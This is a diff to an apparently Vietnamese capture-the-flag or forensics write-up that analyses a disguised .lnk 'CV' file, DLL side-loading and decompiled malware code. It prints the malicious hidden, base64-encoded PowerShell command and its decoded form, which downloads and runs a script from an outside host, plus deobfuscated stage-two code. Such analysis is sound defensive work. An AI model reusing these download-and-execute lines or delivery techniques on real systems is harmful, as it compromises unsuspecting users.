@@ -18,14 +18,14 @@ Archive password: infected
 ![image](./images/artifacts.png)
 - Challenge cho 1 tệp pcapng và thư mục Users của máy victim
 ![image](./images/downloadFolder.png)
-- Trong thư mục Download của user Patrick chứa 1 tệp double-extension là Aurelio_Nadeau_CV.pdf.lnk , đây là 1 tệp lnk ngụy trang dưới 1 tệp pdf (mặc định đối với tệp nhiều hơn 1 extension, window chỉ hiển thị 1 do đó user sẽ chỉ thấy đuôi pdf trong khi tệp thực sự là lnk). Ngoài ra, tệp zip Aurelio Nadeau.zip giải nén ra 2 tệp là lnk và Cover_letter.pdf.
-- lnk là một tệp shortcut trong window, trường Target trong Properties của loại tệp này thường chứa full path tới tệp exe tương ứng của program đích. Tuy nhiên, attacker có thể đặt vào trường Target các câu lệnh độc hại. Sử dụng LECmd để parse tệp lnk này:
+- Trong thư mục Downloads của người dùng Patrick có một tệp mang tên Aurelio_Nadeau_CV.pdf.lnk. Đây là một tệp window shortcut (.lnk) sử dụng kỹ thuật double extension để ngụy trang, khiến tên tệp trông giống một tài liệu pdf. Theo mặc định, window bật tùy chọn "Hide extensions for known file types" (ẩn phần mở rộng đối với các kiểu file quen thuộc). Do đó, user nhìn thấy tệp chỉ hiện tên Aurelio Nadeau.pdf kèm biểu tượng giống hệt file pdf vô hại, nhưng thực chất nó là tệp thực thi mã độc đuôi .lnk. Ngoài ra, tệp zip Aurelio Nadeau.zip giải nén ra 2 tệp là lnk và Cover_letter.pdf.
+- Trường Target trong Properties của tệp lnk này thường chứa full path tới tệp exe tương ứng của program đích. Tuy nhiên, attacker có thể đặt vào trường Target các câu lệnh độc hại. Sử dụng LECmd để parse tệp lnk này:
 ![image](./images/lecmd.png)
 - Câu lệnh powershell độc hại được thực thi khi user click vào tệp lnk:
 ```powershell
 powershell.exe -WindowStyle Hidden -NoProfile -nop -ExecutionPolicy Bypass -EncodedCommand JABjAG4AagBhAHMAawBjAG4AcwBqAGsAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBDAG8AbQBPAGIAagBlAGMAdAAgAFMAaABlAGwAbAAuAEEAcABwAGwAaQBjAGEAdABpAG8AbgApAC4ATgBhAG0AZQBTAHAAYQBjAGUAKAAnAHMAaABlAGwAbAA6AEQAbwB3AG4AbABvAGEAZABzACcAKQAuAFMAZQBsAGYALgBQAGEAdABoACAAKwAgACIAXAA4ADEAMgBoAG8AcQBxAC4AcABzADEAIgA7ACQAYQBzAG8AagBtAHMAYQBwAHMAYQBwAG8AIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAGEAcwBvAGoAbQBzAGEAcABzAGEAcABvAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AZQBkAGMAdgBiAGcAdAByAGYALgBtAGUAZABpAGEAbgBlAHcAcwBvAG4AbABpAG4AZQAuAGMAbwBtADoAOAAwADAAMAAvADgAMQAyAGgAbwBxAHEALgBwAHMAMQAiACwAIAAkAGMAbgBqAGEAcwBrAGMAbgBzAGoAawApADsAIAAmACAAJABjAG4AagBhAHMAawBjAG4AcwBqAGsAOwAgAFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgACQAYwBuAGoAYQBzAGsAYwBuAHMAagBrADsA
 ```
-- Câu lệnh trên thực thi 1 đoạn powershel bị encode base64 với cửa sổ ẩn, bỏ qua Execution Policy, decode base64:
+- Câu lệnh trên thực thi 1 đoạn powershel bị encode base64 với cửa sổ ẩn, bỏ qua Execution Policy. Decode base64:
 ```powershell
 $cnjaskcnsjk = (New-Object -ComObject Shell.Application).NameSpace('shell:Downloads').Self.Path + "\812hoqq.ps1";
 $asojmsapsapo = New-Object Net.WebClient;
@@ -35,7 +35,6 @@ $asojmsapsapo.DownloadFile("http://edcvbgtrf.medianewsonline.com:8000/812hoqq.ps
 ![image](./images/812hoqqPs1Export.png)
 - Nội dung tệp 812hoqq.ps1 sau khi deobfucate:
 ```powershell
-
 # lấy đường dẫn thư mục downloads
 $a1b2c3 = (New-Object -ComObject Shell.Application).NameSpace("shell:Downloads").Self.Path
 # lấy path tới tệp có tên bắt đầu = Cover_letter (Cover_letter.pdf)
@@ -68,7 +67,7 @@ if ($l4m5n6){
 ![image](./images/die.png)
 
 ![image](./images/virustotalWb11.png)
-- Tuy nhiên, check tệp với DIE ta thấy tệp có chữ ký hợp lệ và kết quả từ virustotal cũng không cho thấy dấu hiệu độc hại. Tuy nhiên, có thể WB11Config.exe nạp vào tệp Dll độc hại được tải về kèm theo trong tệp zip (đây là kĩ thuật DLL Side-Loading, trong đó, một program exe vô hại nạp và thực thi một Dll độc hại), kiểm tra chữ kỹ các tệp dll trong cùng thư mục:
+- Tuy nhiên, check tệp với die ta thấy tệp có chữ ký và kết quả từ virustotal cũng không cho thấy dấu hiệu độc hại. Có thể WB11Config.exe nạp vào tệp Dll độc hại được tải về kèm theo trong tệp zip (đây là kĩ thuật DLL Side-Loading, trong đó, một program exe vô hại nạp và thực thi một Dll độc hại), kiểm tra chữ kỹ các tệp dll trong cùng thư mục:
 ![image](./images/sigcheck.png)
 - Tệp wblindp2.dll:
 ![image](./images/wblindp2Dll.png)
@@ -167,7 +166,7 @@ executeRunNowFunc:
     }
   }
 ```
-- malware lần lượt so sánh tên tệp thực thi hiện hại với 3 chuỗi là msedge.exe, explorer.exe và rundll32.exe, nếu ko trùng với 1 trong 3 (biến num = 3) thì malware lấy path của Dll hiện tại (ở đây là wblindp2.dll), thực thi với commandline "rundll32.exe ...\wblindp2.dll,RunNow". Nếu thực thi thành công thì CloseHandle và return 0, còn không,  gọi hàm RunNow_0(). Ngoài ra, hàm RunNow_0() được gọi khi hàm export RunNow() chạy:
+- malware lần lượt so sánh tên tệp thực thi hiện hại với 3 chuỗi là msedge.exe, explorer.exe và rundll32.exe, nếu ko trùng với 1 trong 3 (biến num = 3) thì lấy path của Dll hiện tại (ở đây là wblindp2.dll), thực thi với commandline "rundll32.exe ...\wblindp2.dll,RunNow". Nếu thực thi thành công thì CloseHandle và return 0, còn không, gọi hàm RunNow_0(). Ngoài ra, hàm RunNow_0() được gọi khi hàm export RunNow() chạy:
 ```cpp
 // attributes: thunk
 void __cdecl RunNow()
@@ -221,7 +220,7 @@ void __cdecl RunNow()
   return 0;                                     // nếu có, return 0
 }
 ```
-- Nếu tên tệp thực thi hiện tại match 1 trong 3 chuỗi trên, malware kiểm tra xem nếu là rundll32.exe thì return 0 ngay lập tức (có thể malware đang detect việc bị phân tích động hay debug bằng cách chạy trực tiếp rundll32.exe tham số là dll độc hại) còn ko, thực thi hàm RunNow_0.
+- Nếu tên tệp thực thi hiện tại match 1 trong 3 chuỗi trên, malware kiểm tra xem nếu là rundll32.exe thì return 0 ngay lập tức
 - Phân tích hàm RunNow_0():
 ```cpp
   param = param_1;
